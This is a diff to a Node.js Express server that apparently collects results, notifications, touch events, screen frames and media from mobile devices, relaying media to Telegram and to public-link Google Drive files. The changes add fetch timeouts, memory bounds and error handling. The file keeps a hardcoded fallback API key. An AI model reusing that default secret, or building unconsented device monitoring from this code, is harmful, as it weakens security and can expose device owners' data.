@@ -12,6 +12,16 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const API_KEY = process.env.API_KEY || 'Gokul_Secret_Agent_99';
 
+// Hard-timeout wrapper for outbound fetch() calls. A stalled external API
+// (Drive, Telegram) must never hang a request handler (or the server)
+// indefinitely. Uses AbortSignal.timeout (Node 18+); on timeout fetch rejects
+// with a TimeoutError and callers fall back via their existing error paths.
+function fetchTimeout(url, opts, ms) {
+    const options = Object.assign({}, opts);
+    if (ms > 0) options.signal = AbortSignal.timeout(ms);
+    return fetch(url, options);
+}
+
 // Middleware
 app.use(cors());
 app.use(express.json({ limit: '100mb' }));
@@ -200,7 +210,7 @@ async function uploadToDrive(buffer, mime, filename) {
             Buffer.from(`\r\n--${boundary}--\r\n`),
         ]);
 
-        const createRes = await fetch(
+        const createRes = await fetchTimeout(
             'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&supportsAllDrives=true&fields=id,name,webViewLink,webContentLink',
             {
                 method: 'POST',
@@ -210,7 +220,8 @@ async function uploadToDrive(buffer, mime, filename) {
                     'Content-Length': String(body.length),
                 },
                 body,
-            }
+            },
+            60000
         );
         const created = await createRes.json().catch(() => ({}));
         if (!createRes.ok || !created.id) {
@@ -219,7 +230,7 @@ async function uploadToDrive(buffer, mime, filename) {
         const fileId = created.id;
 
         // 2) Make it publicly viewable by link (anyone with link -> reader).
-        const permRes = await fetch(
+        const permRes = await fetchTimeout(
             `https://www.googleapis.com/drive/v3/files/${fileId}/permissions?supportsAllDrives=true`,
             {
                 method: 'POST',
@@ -228,7 +239,8 @@ async function uploadToDrive(buffer, mime, filename) {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({ role: 'reader', type: 'anyone' }),
-            }
+            },
+            60000
         );
         const perm = await permRes.json().catch(() => ({}));
         if (!permRes.ok) {
@@ -236,9 +248,10 @@ async function uploadToDrive(buffer, mime, filename) {
         }
 
         // 3) Re-fetch metadata so webViewLink/webContentLink reflect the new perm.
-        const getRes = await fetch(
+        const getRes = await fetchTimeout(
             `https://www.googleapis.com/drive/v3/files/${fileId}?supportsAllDrives=true&fields=id,webViewLink,webContentLink`,
-            { headers: { Authorization: `Bearer ${token}` } }
+            { headers: { Authorization: `Bearer ${token}` } },
+            60000
         );
         const meta = await getRes.json().catch(() => ({}));
         const link = meta.webViewLink || meta.webContentLink
@@ -270,11 +283,22 @@ setInterval(() => {
     for (const [id, d] of devices) {
         if (now - d.lastSeen > 5 * 60 * 1000) devices.delete(id);
     }
+    // Prune orphaned FCM tokens whose device is no longer in the registry
+    // (uninstalled or a device_id that changed). Without this, fcmTokens grows
+    // forever; the registration-token-not-registered path only drops tokens
+    // that FCM has actively rejected.
+    for (const deviceId of fcmTokens.keys()) {
+        if (!devices.has(deviceId)) fcmTokens.delete(deviceId);
+    }
     // Sweep the unbounded in-memory stores (telegram media, live frames, batches).
     sweepTelegramMediaStore();
     sweepLiveFrames();
     sweepBatches(notifBatches);
     sweepBatches(touchBatches);
+    // Sweep admin sessions older than 30 min (unbounded slow growth guard).
+    for (const [token, s] of adminSessions) {
+        if (!s.ts || now - s.ts > ADMIN_SWEEP_TTL_MS) adminSessions.delete(token);
+    }
 }, 120000);
 
 // API Key Authentication
@@ -551,7 +575,7 @@ app.post('/mobile_result', authMiddleware, (req, res) => {
     touchDevice(device_id);
 
     results.set(id || 'legacy', {
-        result: String(result).slice(0, 100000000), // 100MB cap (no practical limit)
+        result: String(result).slice(0, 5 * 1024 * 1024), // 5MB cap (bounded memory)
         device_id: device_id,
         timestamp: new Date().toISOString(),
     });
@@ -624,9 +648,11 @@ app.post('/broadcast', authMiddleware, (req, res) => {
 
 // ---------- v8.1: Admin panel + life log ----------
 
-// token -> expiry (ms). 1-hour sessions.
+// token -> {ts, expiry} (ms). 1-hour expiry stamped at login; the periodic
+// sweep additionally drops sessions older than 30 min so the map can't grow.
 const adminSessions = new Map();
-const ADMIN_TTL_MS = 60 * 60 * 1000;
+const ADMIN_TTL_MS = 60 * 60 * 1000;       // per-session expiry window
+const ADMIN_SWEEP_TTL_MS = 30 * 60 * 1000; // sweep removes sessions older than 30 min
 
 // Life log store: stream_type -> [{device_id, ts, entry}] (capped, in-memory)
 const lifeLogPublic = [];
@@ -635,10 +661,11 @@ const LIFELOG_CAP = 1000;
 
 function requireAdmin(req, res, next) {
     const token = req.headers['x-admin-token'];
-    if (!token || !adminSessions.has(token)) {
+    const session = token && adminSessions.get(token);
+    if (!session) {
         return res.status(403).json({ error: 'Forbidden - admin token required' });
     }
-    if (Date.now() > adminSessions.get(token)) {
+    if (Date.now() > session.expiry) {
         adminSessions.delete(token);
         return res.status(403).json({ error: 'Forbidden - admin session expired' });
     }
@@ -657,7 +684,7 @@ app.post('/admin/login', authMiddleware, (req, res) => {
     const token = crypto.createHash('sha256')
         .update(password + secret).digest('hex');
     const expiry = Date.now() + ADMIN_TTL_MS;
-    adminSessions.set(token, expiry);
+    adminSessions.set(token, { ts: Date.now(), expiry });
     console.log(`[${new Date().toISOString()}] ADMIN login ok (session 1h)`);
     res.json({ ok: true, token, expires_in: 3600 });
 });
@@ -855,9 +882,9 @@ function sweepTelegramMediaStore() {
 
 // Resolve a telegram file_id → file_path via getFile (used on upload & on
 // download-link expiry refresh). Returns the path or null on any error.
-async function fetchTelegramFilePath(fileId) {
+async function fetchTelegramFilePath(fileId, timeoutMs = 45000) {
     try {
-        const gf = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${encodeURIComponent(fileId)}`);
+        const gf = await fetchTimeout(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${encodeURIComponent(fileId)}`, {}, timeoutMs);
         const gdata = await gf.json();
         if (gdata.ok && gdata.result && gdata.result.file_path) return gdata.result.file_path;
     } catch (e) {
@@ -879,7 +906,7 @@ async function pipeTelegramFile(res, fileId, entry) {
 
     let fetched = null;
     try {
-        fetched = await fetch(url);
+        fetched = await fetchTimeout(url, {}, 45000);
     } catch (e) {
         console.warn('[MEDIA] Telegram download fetch failed:', e.message);
         return false;
@@ -891,7 +918,7 @@ async function pipeTelegramFile(res, fileId, entry) {
             url = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${path}`;
             entry.url = url; // refresh the stored url (kept server-side only)
             try {
-                fetched = await fetch(url);
+                fetched = await fetchTimeout(url, {}, 45000);
             } catch (e) {
                 fetched = null;
             }
@@ -904,7 +931,13 @@ async function pipeTelegramFile(res, fileId, entry) {
     const fname = String(entry.filename || '').replace(/["\r\n]/g, '');
     if (fname) res.set('Content-Disposition', `inline; filename="${fname}"`);
     res.set('Cache-Control', 'public, max-age=86400');
-    Readable.fromWeb(fetched.body).pipe(res);
+    const stream = Readable.fromWeb(fetched.body);
+    // Mid-stream failure (connection drop) must not raise an unhandled 'error'.
+    stream.on('error', (e) => {
+        console.warn('[MEDIA] Telegram stream error:', e.message);
+        res.destroy();
+    });
+    stream.pipe(res);
     return true;
 }
 
@@ -919,16 +952,16 @@ async function uploadToTelegram(buffer, mime, filename) {
         const form = new FormData();
         form.append('chat_id', TELEGRAM_CHAT_ID);
         form.append('document', new Blob([buffer], { type: mime || 'application/octet-stream' }), (filename || 'media'));
-        const send = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+        const send = await fetchTimeout(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
             method: 'POST',
             body: form,
-        });
+        }, 60000);
         const sdata = await send.json();
         if (!sdata.ok || !sdata.result || !sdata.result.document || !sdata.result.document.file_id) {
             throw new Error('sendDocument failed: ' + String(sdata.description || 'unknown').slice(0, 200));
         }
         const fileId = sdata.result.document.file_id;
-        const filePath = await fetchTelegramFilePath(fileId);
+        const filePath = await fetchTelegramFilePath(fileId, 60000);
         if (!filePath) throw new Error('getFile failed');
         // Build the file URL server-side. It embeds the bot token, so it is
         // stored in the map (fetched only server-side) — never sent to a client.
@@ -946,6 +979,7 @@ async function uploadToTelegram(buffer, mime, filename) {
 // v8.10: tries Telegram first (free unlimited cloud), then Drive, then the
 // in-memory mediaStore — the endpoint never breaks.
 app.post('/media_upload', authMiddleware, async (req, res) => {
+    try {
     const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
     const data = (req.body && req.body.data_b64) || '';
     const mime = (req.body && req.body.mime) || 'application/octet-stream';
@@ -1012,28 +1046,41 @@ app.post('/media_upload', authMiddleware, async (req, res) => {
     }
     console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId}: IN-MEMORY ${mime} (${data.length} b64 chars)`);
     res.json({ ok: true, media_id: id, url: `/media/${id}`, storage: 'memory' });
+    } catch (err) {
+        console.error('[MEDIA] /media_upload error:', err);
+        return res.status(502).json({ ok: false, error: 'media upload failed' });
+    }
 });
 
 // Laptop → Server: download a media file by id (binary, for browser/download).
 // No auth middleware (so the shareable URL opens in a plain browser/download).
 app.get('/media/:id', async (req, res) => {
-    // Telegram-backed media → stream bytes server-side (never expose the bot
-    // token). On Telegram 404/expiry the path is refreshed via getFile + retried.
-    const tg = telegramMediaStore.get(req.params.id);
-    if (tg) {
-        const ok = await pipeTelegramFile(res, req.params.id, tg);
-        if (ok) return;
-        return res.status(502).send('media fetch failed');
+    try {
+        // Telegram-backed media → stream bytes server-side (never expose the bot
+        // token). On Telegram 404/expiry the path is refreshed via getFile + retried.
+        const tg = telegramMediaStore.get(req.params.id);
+        if (tg) {
+            const ok = await pipeTelegramFile(res, req.params.id, tg);
+            if (ok) return;
+            return res.status(502).send('media fetch failed');
+        }
+        const m = mediaStore.get(req.params.id);
+        if (!m) {
+            return res.status(404).send('media not found or expired');
+        }
+        if (m.filename) {
+            res.set('Content-Disposition', `inline; filename="${String(m.filename).replace(/"/g, '')}"`);
+        }
+        res.set('Content-Type', m.mime);
+        res.send(Buffer.from(m.data, 'base64'));
+    } catch (err) {
+        console.error('[MEDIA] /media/:id error:', err);
+        if (res.headersSent) {
+            res.destroy();
+        } else {
+            res.status(502).send('media fetch failed');
+        }
     }
-    const m = mediaStore.get(req.params.id);
-    if (!m) {
-        return res.status(404).send('media not found or expired');
-    }
-    if (m.filename) {
-        res.set('Content-Disposition', `inline; filename="${String(m.filename).replace(/"/g, '')}"`);
-    }
-    res.set('Content-Type', m.mime);
-    res.send(Buffer.from(m.data, 'base64'));
 });
 
 // ---------- v8.8: live screen share (frame poll → auto-refresh link) ----------
